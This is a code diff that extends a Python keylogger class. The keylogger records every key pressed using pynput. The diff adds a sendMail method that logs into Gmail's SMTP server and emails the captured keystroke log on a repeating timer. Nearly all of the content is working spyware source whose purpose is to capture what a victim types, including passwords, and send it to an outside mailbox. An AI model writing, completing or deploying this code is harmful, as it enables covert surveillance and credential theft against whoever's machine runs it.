@@ -3,6 +3,7 @@ Allows us to monitor and control mouse and keyboard.
 '''
 import pynput.keyboard
 import threading
+import smtplib
 
 class Keylogger:
 
@@ -10,8 +11,11 @@ class Keylogger:
     '''
     Constructor. Executed automatically when object is created.
     '''
-    def __init__(self):
-        self.log = ""
+    def __init__(self, time_interval, email, password):
+        self.log = "Keylogger started."
+        self.time_interval = time_interval
+        self.email = email
+        self.password = password
 
     '''
     Append string to the log.
@@ -40,10 +44,24 @@ class Keylogger:
     '''
     def report(self):
         print(self.log)
+        self.sendMail(self.email, self.password, "\n\n" + self.log)
         self.log = ""
-        timer = threading.Timer(5, self.report)    #After 5 seconds call the function report, runs on a separate thread.
+        timer = threading.Timer(self.time_interval, self.report)    #After 5 seconds call the function report, runs on a separate thread.
         timer.start()
 
+    '''
+    Sends the log to email.
+    '''
+    def sendMail(self, email, password, message):
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
+
+    '''
+    Starts listening for keyboard input and then sends the results to an email.
+    '''
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)    #Everytime a key is pressed print it.
         with keyboard_listener:
